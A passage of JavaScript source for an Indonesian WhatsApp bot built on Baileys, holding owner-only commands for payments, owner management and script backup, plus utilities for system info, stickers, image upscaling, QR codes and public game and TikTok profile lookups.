"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Dana Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.dana}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgovo
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"OVO Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.ovo}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imggopay
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Gopay Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.gopay}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgqris
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\" QRIS Payment\",\"url\":\"${global.image.qris}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}
]
})
})}
}}, {userJid: m.sender, quoted: qtext2})
await Sky.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break

//================================================================================

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA SKYZOPEDIA*

* *Nomor :* 085624297893
* *Atas Nama :* M** H****

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Sky.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//================================================================================

case "qris": {
if (!isCreator) return 
await Sky.sendMessage(m.chat, {image: {url: global.image.qris}, caption: "\n*PAYMENT QRIS SKYZOPEDIA*\n\n*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`"}, {quoted: qtext2})
}
break

//================================================================================

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//================================================================================

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await Sky.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//================================================================================

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await Sky.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break


//================================================================================

case "developerbot": case "owner": {
await Sky.sendContact(m.chat, [global.owner], m)
}
break

//================================================================================

case "save": case "sv": {
if (!isCreator) return
await Sky.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//================================================================================

case "self": {
if (!isCreator) return
Sky.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//================================================================================

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//================================================================================

case 'ping' :
case 'uptime' :
case 'os' :
case 'upt' : {
await Sky.sendMessage(m.chat, { react: { text: '⏸️', key: m.key }})
try {
  const fs = require("fs")
  const path = require("path")
  const os = require("os")

  const senderNumber = m.sender.split("@")[0]
  const senderJid = m.sender
  const senderLid = senderJid.endsWith("@lid")
  ? senderJid
  : null
  const chatId = m.chat
  const isGroup = m.isGroup

  const ownerNumber = Array.isArray(global.owner) ? global.owner : [global.owner]
  const ownerTag = `@${ownerNumber[0]}`
  const isOwner = ownerNumber.includes(senderNumber)
  const isPrivateOwner = isOwner && !isGroup

  const tagUser = `@${senderNumber}`

  // ===== LATENCY =====
  const t0 = speed()
  const latency = speed() - t0

  // ===== SYSTEM =====
  const tot = await nou.drive.info()
  const osInfo = nou.os.oos()
  const cpu = os.cpus()
  const load = os.loadavg()
  const netIF = Object.keys(os.networkInterfaces()).length

  // ===== MEMORY =====
  const totalMem = os.totalmem()
  const freeMem = os.freemem()
  const usedMem = totalMem - freeMem
  const ramPercent = ((usedMem / totalMem) * 100).toFixed(2)

  // ===== PROCESS =====
  const pmem = process.memoryUsage()
  const pcpu = process.cpuUsage()

  // ===== UPTIME =====
  const botUp = runtime(process.uptime())
  const vpsUp = runtime(os.uptime())

  // ===== DATE & TIME =====
  const date = new Date().toLocaleDateString("id-ID", {
    day: "2-digit",
    month: "long",
    year: "numeric"
  })
  const timeWIB  = new Date().toLocaleTimeString("id-ID", { timeZone: "Asia/Jakarta" })
  const timeWITA = new Date().toLocaleTimeString("id-ID", { timeZone: "Asia/Makassar" })
  const timeWIT  = new Date().toLocaleTimeString("id-ID", { timeZone: "Asia/Jayapura" })

  // ===== DISK =====
  const diskPercent = ((tot.usedGb / tot.totalGb) * 100).toFixed(2)

  // ===== CONTAINER =====
  const isDocker = fs.existsSync("/.dockerenv") ? "Docker" : "Non-Docker"

  // ===== BOT TYPE + COUNT =====
  const pluginsPath = path.join(process.cwd(), "plugins")
  const pluginCount = fs.existsSync(pluginsPath)
    ? fs.readdirSync(pluginsPath).filter(v => v.endsWith(".js")).length
    : 0

  let caseCount = 0
  try {
    const mainFile = fs.readFileSync(__filename, "utf8")
    caseCount = (mainFile.match(/case\s+['"`]/g) || []).length
  } catch {}

  const botTypeText = [
    caseCount > 0 ? "Case" : null,
    pluginCount > 0 ? "Plugins" : null
  ].filter(Boolean).join(" + ") || "Unknown"

  // ===== PACKAGE.JSON =====
  let pkg = {}
  try {
    pkg = JSON.parse(fs.readFileSync(path.join(process.cwd(), "package.json")))
  } catch {}

  const deps = Object.keys(pkg.dependencies || {})
  const devDeps = Object.keys(pkg.devDependencies || {})
  const loadedModules = Object.keys(require.cache).length

  // ===== NODE_MODULES SIZE =====
  const getDirSize = dir => {
    let size = 0
    if (!fs.existsSync(dir)) return 0
    for (const f of fs.readdirSync(dir)) {
      const full = path.join(dir, f)
      try {
        const s = fs.statSync(full)
        size += s.isDirectory() ? getDirSize(full) : s.size
      } catch {}
    }
    return size
  }

  const nodeModulesSize = fs.existsSync("node_modules")
    ? formatp(getDirSize("node_modules"))
    : "N/A"

  // ===== BAILEYS =====
  let baileysName = "Unknown"
  let baileysVersion = "Unknown"
  try {
    const key = Object.keys(pkg.dependencies || {}).find(v =>
      v.toLowerCase().includes("baileys")
    )
    if (key) {
      baileysName = key
      baileysVersion = pkg.dependencies[key]
    } else {
      const b = require("@whiskeysockets/baileys")
      baileysName = "Baileys (Runtime)"
      baileysVersion = b.version || "Git / Custom"
    }
  } catch {
    baileysName = "Baileys (Custom Build)"
    baileysVersion = "Git / Fork"
  }

  // ===== RESPONSE =====
  const respon = `
╭───────────〔 🤖 ${global.botname2} 〕───────────╮
│ SYSTEM SUMMARY
│ • OS        : ${os.platform()} (${os.arch()})
│ • Kernel    : ${os.release()}
│ • Hostname  : ${isPrivateOwner ? os.hostname() : "Hidden"}
│ • Docker    : ${isDocker}
│ • Net IF    : ${netIF}
│ • VPS Up    : ${vpsUp}
│ • CPU       : ${cpu[0].model} (${cpu.length} Core)
│ • Load Avg  : ${load[0]} | ${load[1]} | ${load[2]}
│ • RAM       : ${formatp(usedMem)} / ${formatp(totalMem)} (${ramPercent}%)
│ • Disk      : ${tot.usedGb}/${tot.totalGb} GB (${diskPercent}%)
│ • Node.js   : ${process.version}
│ • Baileys   : ${baileysVersion}
│ • Response  : ${latency.toFixed(4)} ms
├──────────────────────────────────
│ USER INFO
│ • Nama      : ${tagUser}
│ • Nomor     : ${senderNumber}
│ • User ID   : ${senderJid}
│ • User LID   : ${senderLid}
│ • Status    : ONLINE
│ • Chat Type : ${isGroup ? "GROUP" : "PRIVATE"}
├──────────────────────────────────
│ GROUP INFO
│ • Group ID  : ${isGroup ? chatId : "-"}
│ • Context   : ${isGroup ? "Grup" : "Private Chat"}
├──────────────────────────────────
│ TIME INFO
│ • Tanggal   : ${date}
│ • WIB       : ${timeWIB}
│ • WITA      : ${timeWITA}
│ • WIT       : ${timeWIT}
├──────────────────────────────────
│ BOT DETAIL
│ • Nama Bot  : ${global.botname2}
│ • Versi    : ${global.versi || "unknown"}
│ • Mode     : ${global.public ? "PUBLIC" : "SELF"}
│ • Type     : ${botTypeText}
│ • Prefix   : ${prefix || "-"}
│ • Case Cmd : ${caseCount}
│ • Plugin   : ${pluginCount}
│ • Runtime  : ${botUp}
│ • VPS Up   : ${vpsUp}
├──────────────────────────────────
│ OWNER INFO
│ • Creator  : ${ownerTag}
│ • Number   : ${ownerNumber[0]}
├──────────────────────────────────
│ MODULE & LIBRARY
│ • Baileys  : ${baileysName}
│ • Version  : ${baileysVersion}
│ • Deps     : ${deps.length}
│ • DevDeps  : ${devDeps.length}
│ • Loaded   : ${loadedModules}
│ • Size     : ${nodeModulesSize}
├──────────────────────────────────
${isPrivateOwner ? `
│ PROCESS (OWNER)
│ • PID      : ${process.pid}
│ • Exec     : ${process.execPath}
│ • ENV      : ${process.env.NODE_ENV || "undefined"}
│ • RSS      : ${formatp(pmem.rss)}
│ • Heap     : ${formatp(pmem.heapUsed)} / ${formatp(pmem.heapTotal)}
│ • CPU      : ${(pcpu.user / 1e6).toFixed(2)}s | ${(pcpu.system / 1e6).toFixed(2)}s
` : `
│ PROCESS
│ • Detail   : Hidden
`}
│ NETWORK
${isPrivateOwner
  ? `│ • IPv4     : ${osInfo.ipv4 || "Hidden"}
│ • IPv6     : ${osInfo.ipv6 || "Hidden"}`
  : `│ • IP       : Hidden`}
├──────────────────────────────────
│ ✨ BOT READY
│ ➜ Ketik *.menu*
╰──────────────────────────────────╯
`
await Sky.sendMessage(m.chat, { react: { text: '🟢', key: m.key }})
  await Sky.sendMessage(
  m.chat,
  {
    text: respon,
    mentions: [
      senderJid,
      `${ownerNumber[0]}@s.whatsapp.net`
    ]
  },
  { quoted: m }
)
  } catch (e) {
  console.log(e)
  Reply(`Gagal mengambil info 'Cause: ${e}`)
  }
  }
  break

//================================================================================

case "public": {
if (!isCreator) return
Sky.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//================================================================================

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//================================================================================

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya"))
await Sky.sendMessage(idSaluran, {text: text})
m.reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//================================================================================

case "upchannel2": case "upch2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await Sky.downloadAndSaveMediaMessage(qmsg)
await Sky.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
m.reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//================================================================================

case "getsc": {
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Rafz Bot`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Sky.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//================================================================================

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//================================================================================

case "setppbot": case "setpp": {
  if (!isCreator) return Reply(mess.owner)
  if (!quoted) return Reply('Reply Image')
  if (!/image/.test(mime)) return Reply('Reply Image With Caption')
  if (/webp/.test(mime)) return Reply('Reply Image Not Sticker')
  
  try {
    let media = await Sky.downloadAndSaveMediaMessage(quoted)
    if (args[0] && args[0] == "panjang") {
      try {
        const { img } = await generateProfilePicture(media)
        await Sky.query({
          tag: 'iq',
          attrs: {
            to: botNumber,
            type: 'set',
            xmlns: 'w:profile:picture'
          },
          content: [
            {
              tag: 'picture',
              attrs: { type: 'image' },
              content: img
            }
          ]
        })
        fs.unlinkSync(media)
        Reply("Berhasil mengganti foto profil bot ✅")
      } catch (e) {
        console.log(e)
        Reply("Terjadi kesalahan saat mengatur foto profil panjang")
      }
    } else {
      try {
        await Sky.updateProfilePicture(botNumber, { url: media })
        fs.unlinkSync(media)
        Reply("Berhasil mengganti foto profil bot ✅")
      } catch (e) {
        console.log(e)
        Reply("Terjadi kesalahan saat mengatur foto profil")
      }
    }
  } catch (e) {
    console.log(e)
    Reply(`${e}`)
  }
}
break

//================================================================================

case "clearchat": case "clc": {
Sky.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Sky.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//================================================================================

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//================================================================================

case "jadwal": {
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
let res = await getBuffer(`https://img5.pixhost.to/images/3047/569485980_rafzbot.jpg`)
const fs = require('fs')
await Sky.sendMessage(m.chat, { image: res, mimetype: "image/png"}, {quoted: m})
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break


//=============================================================================
    
case "swmd": case "stickerwmd": case "stikerwmd": case "wmd": {
if (!/image|video/gi.test(mime)) return m.reply(example("Kirim media dan tambahkan keterangan .swmd"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
var image = await Sky.downloadAndSaveMediaMessage(qmsg)
await Sky.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//===========================================================================
 
case 'hdr': {
async function Upscale(imageBuffer) {
 try {
 const response = await fetch("https://lexica.qewertyy.dev/upscale", {
 body: JSON.stringify({
 image_data: Buffer.from(imageBuffer, "base64"),
 format: "binary",
 }),
 headers: {
 "Content-Type": "application/json",
 },
 method: "POST",
 });
 return Buffer.from(await response.arrayBuffer());
 } catch {
 return null;
 }
}
if (!/image/.test(mime)) return m.reply(example(`Kirim/kutip gambar dengan caption`))
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
let media = await quoted.download()
let proses = await Upscale(media);
Sky.sendMessage(m.chat, { image: proses, caption: 'BERHASIL HDR ✅'}, { quoted: null})
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}
break
    
//================================================================================
   
case 'remini' : {
  try {
  const axios = require('axios')

function randomNumber() {
  let randomNumber = Math.floor(Math.random() * 1000000);
  return randomNumber.toString().padStart(6, '0');
}

async function upscale(buffer) {
  const blob = new Blob([buffer], { type: 'image/png' });
  let filename = randomNumber() + '.png';
  let formData = new FormData();
  formData.append('image', {});
  formData.append('image', blob, filename);

  let { data } = await axios.post('https://api.imggen.ai/guest-upload', formData, {
    headers: {
      "content-type": "multipart/form-data",
      origin: "https://imggen.ai",
      referer: "https://imggen.ai/",
      "user-agent": "Mozilla/5.0"
    }
  });

  let result = await axios.post('https://api.imggen.ai/guest-upscale-image', {
    image: {
      "url": "https://api.imggen.ai" + data.image.url,
      "name": data.image.name,
      "original_name": data.image.original_name,
      "folder_name": data.image.folder_name,
      "extname": data.image.extname
    }
  }, {
    headers: {
      "content-type": "application/json",
      origin: "https://imggen.ai",
      referer: "https://imggen.ai/",
      "user-agent": "Mozilla/5.0"
    }
  });

  return `https://api.imggen.ai${result.data.upscaled_image}`;
}
    await Sky.sendMessage(m.chat, { react: { text: `📸`, key: m.key }});

    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    
    if (!mime.startsWith('image/')) {
      throw 'Silakan kirim gambar dengan caption *remini* atau reply gambar!';
    }

    let media = await q.download();
    if (!media) throw 'Gagal mengunduh gambar.';

    let upscaledUrl = await upscale(media);
    if (!upscaledUrl) throw 'Gagal melakukan Upscale gambar.';

    await Sky.sendMessage(m.chat, { react: { text: `✅`, key: m.key }});

    await Sky.sendMessage(m.chat, {
      image: { url: upscaledUrl },
      caption: `*Done*`
    }, { quoted: m });

  } catch (error) {
    await Sky.sendMessage(m.chat, { react: { text: `❌`, key: m.key }});
    await Reply(`❌ *Error:* ${error.message || error}`);
  }
};
break
    
//================================================================================
    
case "tiktokstalk": case "ttstalk": {

    if (!text) return m.reply(`Example: ${prefix + command} username`);

    try {
        await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})

        let api = await fetch(`https://api-rest-rizzkyxofc.vercel.app/api/tools/tiktokstalk?user=${text}`);

        let data = await api.json();

        if (!data.status) return m.reply('User not found!');

        let caption = `乂 *TIKTOK STALK*

◦ *Name* : ${data.result.nama}

◦ *Username* : ${data.result.user}

◦ *Bio* : ${data.result.bio}

◦ *Followers* : ${data.result.followers}

◦ *Following* : ${data.result.following}

◦ *Private* : ${data.result.privatemode ? 'Yes' : 'No'}`;

        await Sky.sendMessage(m.chat, { 

            image: { url: data.result.profile },

            caption: caption 

        });
        await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})

    } catch (e) {

        console.log(e);

        Reply('Error occurred while fetching data!');

    }

}

break
 //================================================================================
    case "telusuriimg":  {
  if (!quoted) return m.reply('Harap balas ke foto yang ingin dianalisis')
  if (!/image/.test(mime)) return m.reply(`Kirim/Balas foto dengan caption ${prefix + command}`)

  const pertanyaan = m.text.replace(`${prefix}grok`, '').trim()
  if (!pertanyaan) return m.reply('Tolong masukkan pertanyaan')

  const BodyForm = require('form-data')
  const uploadFileUgu = async (input) => {
    try {
      const form = new BodyForm()
      form.append("files[]", fs.createReadStream(input))
      const { data } = await axios({
        url: "https://uguu.se/upload.php",
        method: "POST",
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
          ...form.getHeaders()
        },
        data: form,
        timeout: 10000
      })
      if (!data?.files?.[0]) throw new Error('Upload failed')
      return data.files[0]
    } catch (err) {
      throw new Error(`Error uploading file: ${err.message}`)
    }
  }

  try {
    await Sky.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } })
    const media = await Sky.downloadAndSaveMediaMessage(quoted)
    const uploadResult = await uploadFileUgu(media)
    const sessionId = `${m.chat.replace(/[^a-zA-Z0-9]/g, '')}-${Date.now()}`
    const imageUrl = `https://fastrestapis.fasturl.cloud/aillm/grok?ask=${pertanyaan}&imageUrl=${uploadResult.url}&style=Provide a formal response.&sessionId=${sessionId}`
    const response = await axios.get(imageUrl)
    const result = response.data.result
    await Sky.sendMessage(m.chat, { text: result }, { quoted: m })
    fs.unlinkSync(media)
  } catch (error) {
    console.error('Error in grok:', error)
    m.reply('Maaf, terjadi kesalahan saat memproses gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.')
  }
} break
    
//===================================================================================
    
case "cetakqr":{
                    if(!text) return m.reply("Masukan Teks Untuk Dijadikan Qr");
                    m.reply(mess.wait);
                    let ci = `https://api.siputzx.my.id/api/tools/text2qr?text=${encodeURIComponent(text)}`;
                    const response = await axios.get(ci, { responseType: 'arraybuffer' });
                    try {
                        Sky.sendMessage(m.chat, {
                            image: Buffer.from(response.data),
                            caption: '_Sudah Dijadikan Qr_'
                        }, { quoted: m })
                    } catch (e) {
                        console.log(e);
                        await m.reply('Error')
                    }
                }
                break
    
//====================================================================================
   

case "readerqr": case "bacaqr":
    if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.quotedMessage) {
        return Sky.sendMessage(m.key.remoteJid, { text: "❌ Harap reply gambar QR Code untuk membacanya." }, { quoted: m });
    }

    let quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;
    
    if (!quotedMessage.imageMessage) {
        return Sky.sendMessage(m.key.remoteJid, { text: "❌ Harap reply gambar QR Code, bukan teks atau media lain." }, { quoted: m });
    }

    try {
        const stream = await downloadContentFromMessage(quotedMessage.imageMessage, "image");
        let buffer = Buffer.from([]);

        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        let imagePath = "./temp_qr.jpg"; 
        fs.writeFileSync(imagePath, buffer);

        Jimp.read(imagePath, (err, image) => {
            if (err) {
                return Sky.sendMessage(m.key.remoteJid, { text: "❌ Gagal membaca gambar QR Code." }, { quoted: m });
            }

            const qr = new qrCodeReader();
            qr.callback = (error, result) => {
                if (error || !result) {
                    return Sky.sendMessage(m.key.remoteJid, { text: "❌ QR Code tidak valid atau tidak ditemukan." }, { quoted: m });
                }

                Sky.sendMessage(m.key.remoteJid, { text: `✅ Hasil QR Code: ${result.result}` }, { quoted: m });
            };

            qr.decode(image.bitmap);
        });

    } catch (error) {
        console.error("Error membaca QR:", error);
        Sky.sendMessage(m.key.remoteJid, { text: "❌ Terjadi kesalahan saat membaca QR Code." }, { quoted: m });
    }

    break
    
//=====================================================================================
case "epep":
case "ff":
case "ffstalk":{
const { createCanvas, loadImage } = require('canvas');
  try {
    if (!text) return m.reply(`*Format salah!* Gunakan dengan cara:\n\n${prefix + command} <User ID>|<Region Code>\n_Contoh: ${prefix + command} 1687736053|ID_`);
 
    const parts = text.split('|');
    if (parts.length < 1 || parts.length > 2) {
      return m.reply(`*Format salah!* Gunakan dengan cara:\n\n${prefix + command} <User ID>|<Region Code>\n_Contoh: ${prefix + command} 1687736053|ID_\n\nJika region tidak diberikan, defaultnya adalah ID.`);
    }

    const uid = parts[0].trim();
    const region = parts[1] ? parts[1].trim().toUpperCase() : 'ID'; 
    
    if (!uid) {
        return m.reply(`*User ID tidak boleh kosong!* Gunakan format: ${prefix + command} <User ID>|<Region Code>`);
    }

    // --- REAKSI MEMPROSES (⏳) ---
    await Sky.sendMessage(m.chat, {
      react: { text: "⏳", key: m.key }
    });
    // ----------------------------

    const apiUrl = `https://zenzxz.dpdns.org/stalker/freefire?uid=${encodeURIComponent(uid)}&region=${encodeURIComponent(region)}&media=true`;
    
    const response = await axios.get(apiUrl);
    const json = response.data;

    if (!json.status || !json.success) {
      await Sky.sendMessage(m.chat, { react: { text: "❌", key: m.key } }); // Reaksi gagal
      return m.reply(`Gagal mengambil data untuk User ID: ${uid} di region: ${region}. User ID mungkin tidak valid atau tidak ditemukan.`);
    }
    
    const data = json.data; 
    const account = data.account;
    const pet = data.pet;
    const social = data.social;
    const creditScore = data.creditScore;
    const images = data.images;

    let textMessage = `*👤 FREE FIRE USER INFO*\n\n`;
    textMessage += `*🆔 User ID*: ${account.accountId}\n`;
    textMessage += `*👤 Username*: ${account.nickname}\n`;
    textMessage += `*🔰 Level*: ${account.level}\n`;
    textMessage += `*⭐ EXP*: ${account.exp}\n`;
    textMessage += `*🌍 Region*: ${account.region}\n`;
    textMessage += `*👍 Likes*: ${account.likes}\n`;
    textMessage += `*📝 Bio/Signature*: ${social.signature || 'Tidak Tersedia'}\n`;
    textMessage += `*🎂 Created At*: ${account.createdAt}\n`;
    textMessage += `*⏱️ Last Login*: ${account.lastLogin}\n`;
    textMessage += `*🎖️ Credit Score*: ${creditScore.score}\n`;
    textMessage += `*🏆 Rank*: ${account.rank || 'N/A'}\n`;
    textMessage += `*📈 Max Rank*: ${account.maxRank || 'N/A'}\n`;
    textMessage += `*🔪 CS Rank*: ${account.csRank || 'N/A'}\n`;
    
    textMessage += `*👑 Prime Level*: ${account.primeLevel || 'N/A'}\n`;
    textMessage += `*💎 Diamond Cost*: ${account.diamondCost || 'N/A'}\n`;
    textMessage += `*📊 Ranking Points*: ${account.rankingPoints || 'N/A'}\n`;
    textMessage += `*📅 Release Version*: ${account.releaseVersion || 'N/A'}\n`;
    textMessage += `*🗓️ Season ID*: ${account.seasonId || 'N/A'}\n`;
    textMessage += `*🌐 Language*: ${social.language || 'N/A'}\n\n`;
    
    if (pet && pet.name) {
      textMessage += `*🐱 PET INFO*\n`;
      textMessage += `*🐾 Name*: ${pet.name}\n`;
      textMessage += `*🔰 Level*: ${pet.level}\n`;
      textMessage += `*⭐ EXP*: ${pet.exp}\n\n`;
    }

    textMessage += `*Catatan: Beberapa informasi (seperti BR/CS Points spesifik, Booyah Pass, info Guild, dan daftar item terpakai dengan nama) tidak tersedia di API ini.*\n\n`;

    let imageSent = false;

    const mergeBannerAndOutfit = async (bannerUrl, outfitUrl) => {
        try {
            const bannerImg = await loadImage(bannerUrl);
            const outfitImg = await loadImage(outfitUrl);

            const canvasWidth = bannerImg.width; 
            const canvasHeight = bannerImg.height + outfitImg.height; 

            const canvas = createCanvas(canvasWidth, canvasHeight);
            const ctx = canvas.getContext('2d');

            ctx.drawImage(bannerImg, 0, 0);

            const outfitX = (canvasWidth - outfitImg.width) / 2; 
            ctx.drawImage(outfitImg, outfitX, bannerImg.height);

            return canvas.toBuffer('image/png');
        } catch (error) {
            console.error("Error merging images with canvas:", error);
            return null;
        }
    };

    if (images && images.bannerImage && images.outfitImage) {
        const mergedImageBuffer = await mergeBannerAndOutfit(images.bannerImage, images.outfitImage);
        if (mergedImageBuffer) {
            await Sky.sendMessage(m.chat, {
                image: mergedImageBuffer,
                caption: textMessage
            }, { quoted: m });
            imageSent = true;
        } else {
            if (images.outfitImage) {
                await Sky.sendMessage(m.chat, { image: { url: images.outfitImage }, caption: `*Outfits:*\n\n${textMessage}` }, { quoted: m });
                imageSent = true;
            } else if (images.bannerImage) {
                await Sky.sendMessage(m.chat, { image: { url: images.bannerImage }, caption: `*Banner:*\n\n${textMessage}` }, { quoted: m });
                imageSent = true;
            }
        }
    } else if (images && images.outfitImage) {
        await Sky.sendMessage(m.chat, {
            image: { url: images.outfitImage },
            caption: `*Outfits:*\n\n${textMessage}`
        }, { quoted: m });
        imageSent = true;
    } else if (images && images.bannerImage) {
        await Sky.sendMessage(m.chat, {
            image: { url: images.bannerImage },
            caption: `*Banner:*\n\n${textMessage}`
        }, { quoted: m });
        imageSent = true;
    }

    if (!imageSent) {
        await m.reply(textMessage); 
    }

    // --- REAKSI BERHASIL (✅) ---
    await Sky.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
    // --------------------------

  } catch (error) {
    console.error("Error during FF Stalker:", error);
    // --- REAKSI GAGAL (❌) ---
    await Sky.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
    // ------------------------
    m.reply(`Terjadi kesalahan saat mengambil data atau memproses permintaan: ${error.message || error}`);
  }
}
break;

 //====
 case "ml": case "mlstalk": {
  let inputData;
  if (args.length >= 2) {
    inputData = args[1].split('|');
  } else if (body.trim().includes('|')) {
    inputData = body.trim().split(/\s+/)[1].split('|');
  } else {
    m.reply('Format salah! Gunakan: .ml id|zoneid');
    return;
  }
  if (inputData.length < 2) {
    m.reply('Format salah! Gunakan: .ml id|zoneid');
    return;
  }
  const userId = inputData[0];
  const zoneId = inputData[1];
  const axios = require('axios');
